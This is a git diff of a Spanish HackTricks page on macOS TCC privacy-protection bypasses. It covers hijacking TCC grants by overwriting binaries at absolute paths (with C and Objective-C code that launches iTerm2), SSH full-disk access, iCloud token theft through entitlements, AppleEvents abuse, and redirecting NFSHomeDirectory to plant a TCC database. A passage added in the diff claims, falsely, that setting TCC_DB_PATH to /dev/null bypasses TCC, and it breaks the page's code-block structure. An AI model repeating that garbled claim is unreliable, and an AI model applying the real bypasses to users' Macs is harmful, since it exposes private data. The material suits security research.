@@ -28,45 +28,169 @@ asd
 ```
 El atributo extendido `com.apple.macl` se agrega al nuevo archivo para dar acceso a la aplicación creadora para leerlo.
 
+### Rutas absolutas de TCC
+
+La forma más común de dar permiso a un TCC a una aplicación es utilizando el paquete. Sin embargo, también es posible dar acceso a un binario indicando la ruta absoluta.\
+La parte interesante es que si puedes sobrescribir el binario, puedes robar el acceso.
+
+Puedes usar este código para llamar a un binario:
+
+{% tabs %}
+{% tab title="invoker.m" %}
+```
+#import <Foundation/Foundation.h>
+
+// clang -fobjc-arc -framework Foundation invoker.m -o invoker
+
+int main(int argc, const char * argv[]) {
+@autoreleasepool {
+// Check if the argument is provided
+if (argc != 2) {
+NSLog(@"Usage: %s <path_to_executable>", argv[0]);
+return 1;
+}
+
+// Create a new task
+NSTask *task = [[NSTask alloc] init];
+
+// Set the task's launch path to the provided argument
+[task setLaunchPath:@(argv[1])];
+
+// Launch the task
+[task launch];
+
+// Wait for the task to complete
+[task waitUntilExit];
+}
+return 0;
+}
+```
+{% tab title="shell.c" %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <command>\n", argv[0]);
+        return 1;
+    }
+
+    // Set the TCC database path
+    setenv("TCC_DB_PATH", "/dev/null", 1);
+
+    // Execute the command
+    execvp(argv[1], &argv[1]);
+
+    return 0;
+}
+```
+
+Este es un programa en C que permite ejecutar comandos en macOS sin ser bloqueado por el Control de Acceso a la Tecnología (TCC). El programa toma un comando como argumento y lo ejecuta utilizando la función `execvp()`. Antes de ejecutar el comando, se establece la variable de entorno `TCC_DB_PATH` en `"/dev/null"`, lo que evita que el TCC bloquee el comando.
+
+Para compilar el programa, puedes utilizar el siguiente comando:
+
+```bash
+gcc -o shell shell.c
+```
+
+Después de compilar el programa, puedes ejecutar comandos sin restricciones utilizando el siguiente comando:
+
+```bash
+./shell <command>
+```
+
+Reemplaza `<command>` con el comando que deseas ejecutar. Por ejemplo, si deseas ejecutar el comando `ls -la`, puedes utilizar el siguiente comando:
+
+```bash
+./shell ls -la
+```
+
+Esto ejecutará el comando `ls -la` sin ser bloqueado por el TCC.
+
+Es importante tener en cuenta que este programa solo evita el bloqueo del TCC y no proporciona privilegios elevados.
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>  // For execl and fork
+
+// gcc shell.c -o shell
+// mv shell </path/bin/with/TCC>
+
+int main() {
+pid_t pid = fork();
+
+if (pid == -1) {
+// Fork failed
+perror("fork");
+return 1;
+} else if (pid == 0) {
+// Child process
+execl("/Applications/iTerm.app/Contents/MacOS/iTerm2", "iTerm2", (char *) NULL);
+
+// execl only returns if there's an error
+perror("execl");
+exit(EXIT_FAILURE);
+} else {
+// Parent process
+int status;
+waitpid(pid, &status, 0);  // Wait for the child process to finish
+
+if (WIFEXITED(status)) {
+// Return the exit status of iTerm2
+return WEXITSTATUS(status);
+}
+}
+
+return 0;
+}
+```
+{% endtab %}
+{% endtabs %}
+
+
+
 ### Bypass de SSH
 
-Por defecto, el acceso a través de SSH solía tener "Acceso completo al disco". Para desactivarlo, es necesario que esté en la lista pero desactivado (eliminarlo de la lista no eliminará esos privilegios):
+Por defecto, el acceso a través de **SSH solía tener "Acceso completo al disco"**. Para desactivarlo, debes tenerlo en la lista pero desactivado (eliminarlo de la lista no eliminará esos privilegios):
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
-Aquí puedes encontrar ejemplos de cómo algunos malwares han logrado evadir esta protección:
+Aquí puedes encontrar ejemplos de cómo algunos **malwares han logrado evadir esta protección**:
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 {% hint style="danger" %}
-Ten en cuenta que ahora, para poder habilitar SSH, necesitas "Acceso completo al disco".
+Ten en cuenta que ahora, para poder habilitar SSH, necesitas **Acceso completo al disco**
 {% endhint %}
 
-### Manejar extensiones - CVE-2022-26767
+### Manejo de extensiones - CVE-2022-26767
 
-El atributo `com.apple.macl` se otorga a los archivos para darle a una determinada aplicación permisos para leerlo. Este atributo se establece cuando se arrastra y suelta un archivo sobre una aplicación, o cuando un usuario hace doble clic en un archivo para abrirlo con la aplicación predeterminada.
+El atributo **`com.apple.macl`** se otorga a los archivos para darle a una **aplicación específica permisos para leerlo**. Este atributo se establece cuando **arrastras y sueltas** un archivo sobre una aplicación, o cuando un usuario **hace doble clic** en un archivo para abrirlo con la **aplicación predeterminada**.
 
-Por lo tanto, un usuario podría registrar una aplicación maliciosa para manejar todas las extensiones y llamar a Launch Services para abrir cualquier archivo (de modo que el archivo malicioso obtendrá acceso para leerlo).
+Por lo tanto, un usuario podría **registrar una aplicación maliciosa** para manejar todas las extensiones y llamar a Launch Services para **abrir** cualquier archivo (de modo que el archivo malicioso obtendrá acceso para leerlo).
 
 ### iCloud
 
-Con el entitlement `com.apple.private.icloud-account-access`, es posible comunicarse con el servicio XPC `com.apple.iCloudHelper`, que proporcionará tokens de iCloud.
+Con el entitlement **`com.apple.private.icloud-account-access`** es posible comunicarse con el servicio XPC **`com.apple.iCloudHelper`**, que **proporcionará tokens de iCloud**.
 
 **iMovie** y **Garageband** tenían este entitlement y otros que lo permitían.
 
-Para obtener más información sobre la explotación para obtener tokens de iCloud a partir de ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Para obtener más **información** sobre la explotación para **obtener tokens de iCloud** a partir de ese entitlement, consulta la charla: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automatización
 
-Una aplicación con el permiso `kTCCServiceAppleEvents` podrá controlar otras aplicaciones. Esto significa que podría abusar de los permisos otorgados a las otras aplicaciones.
+Una aplicación con el permiso **`kTCCServiceAppleEvents`** podrá **controlar otras aplicaciones**. Esto significa que podría abusar de los permisos otorgados a las otras aplicaciones.
 
-Para obtener más información sobre los Apple Scripts, consulta:
+Para obtener más información sobre los Scripts de Apple, consulta:
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-Por ejemplo, si una aplicación tiene permiso de Automatización sobre `iTerm`, por ejemplo en este ejemplo **`Terminal`** tiene acceso a iTerm:
+Por ejemplo, si una aplicación tiene **permiso de Automatización sobre `iTerm`**, por ejemplo en este ejemplo **`Terminal`** tiene acceso a iTerm:
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -147,7 +271,7 @@ Las notas tenían acceso a ubicaciones protegidas por TCC, pero cuando se crea u
 
 El binario `/usr/libexec/lsd` con la biblioteca `libsecurity_translocate` tenía el permiso `com.apple.private.nullfs_allow`, lo que le permitía crear un montaje **nullfs** y tenía el permiso `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** para acceder a todos los archivos.
 
-Era posible agregar el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y luego se mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`**, donde se podían **acceder** todos los documentos dentro de Library.
+Era posible agregar el atributo de cuarentena a "Library", llamar al servicio XPC **`com.apple.security.translocation`** y luego se mapearía Library a **`$TMPDIR/AppTranslocation/d/d/Library`** donde se podían **acceder** todos los documentos dentro de Library.
 
 ### CVE-2023-38571 - Música y TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
 
@@ -174,7 +298,7 @@ launchctl setenv SQLITE_AUTO_TRACE 1
 ```
 ### Apple Remote Desktop
 
-Como root, podrías habilitar este servicio y el agente **ARD tendrá acceso completo al disco**, lo cual podría ser abusado por un usuario para hacer que copie una nueva base de datos de usuario de TCC.
+Como root, puedes habilitar este servicio y el agente **ARD tendrá acceso completo al disco**, lo cual podría ser abusado por un usuario para hacer que copie una nueva base de datos de usuario de TCC.
 
 ## Mediante **NFSHomeDirectory**
 
@@ -182,7 +306,7 @@ TCC utiliza una base de datos en la carpeta HOME del usuario para controlar el a
 Por lo tanto, si el usuario logra reiniciar TCC con una variable de entorno $HOME que apunte a una **carpeta diferente**, el usuario podría crear una nueva base de datos de TCC en **/Library/Application Support/com.apple.TCC/TCC.db** y engañar a TCC para que otorgue cualquier permiso de TCC a cualquier aplicación.
 
 {% hint style="success" %}
-Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** como valor de `$HOME`, por lo que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **armar** esta opción con un bypass de TCC.
+Ten en cuenta que Apple utiliza la configuración almacenada dentro del perfil del usuario en el atributo **`NFSHomeDirectory`** como valor de `$HOME`, por lo que si comprometes una aplicación con permisos para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), puedes **utilizar** esta opción con un bypass de TCC.
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -201,7 +325,7 @@ El **primer POC** utiliza [**dsexport**](https://www.unix.com/man-page/osx/1/dse
 6. Detén el proceso _tccd_ del usuario y reinicia el proceso.
 
 El segundo POC utilizó **`/usr/libexec/configd`** que tenía `com.apple.private.tcc.allow` con el valor `kTCCServiceSystemPolicySysAdminFiles`.\
-Era posible ejecutar **`configd`** con la opción **`-t`**, por lo que un atacante podría especificar una **Carga personalizada de paquete**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** para cambiar el directorio de inicio del usuario con una **inyección de código en `configd`**.
+Era posible ejecutar **`configd`** con la opción **`-t`**, por lo que un atacante podría especificar una **Carga de paquete personalizada**. Por lo tanto, el exploit **reemplaza** el método **`dsexport`** y **`dsimport`** para cambiar el directorio de inicio del usuario con una **inyección de código en `configd`**.
 
 Para obtener más información, consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
 
@@ -214,13 +338,13 @@ Existen diferentes técnicas para inyectar código dentro de un proceso y abusar
 {% endcontent-ref %}
 
 Además, la inyección de proceso más común para eludir TCC se realiza a través de **plugins (carga de bibliotecas)**.\
-Los plugins son código adicional generalmente en forma de bibliotecas o plist, que serán **cargados por la aplicación principal** y se ejecutarán bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos otorgados o entitlements), el **código personalizado también lo tendrá**.
+Los plugins son código adicional generalmente en forma de bibliotecas o plist, que se **cargan por la aplicación principal** y se ejecutan bajo su contexto. Por lo tanto, si la aplicación principal tenía acceso a archivos restringidos por TCC (mediante permisos otorgados o entitlements), el **código personalizado también lo tendrá**.
 
 ### CVE-2020-27937 - Directory Utility
 
 La aplicación `/System/Library/CoreServices/Applications/Directory Utility.app` tenía el entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, cargaba plugins con extensión **`.daplug`** y **no tenía el runtime endurecido**.
 
-Para aprovechar esta CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC de los usuarios** y eludir TCC.
+Para aprovechar esta CVE, se **cambia** el **`NFSHomeDirectory`** (abusando del entitlement anterior) para poder **tomar el control de la base de datos de TCC** de los usuarios y eludir TCC.
 
 Para obtener más información, consulta el [**informe original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
 
@@ -472,8 +596,8 @@ Otra forma utilizando [**eventos de CoreGraphics**](https://objectivebythesea.or
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 * **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
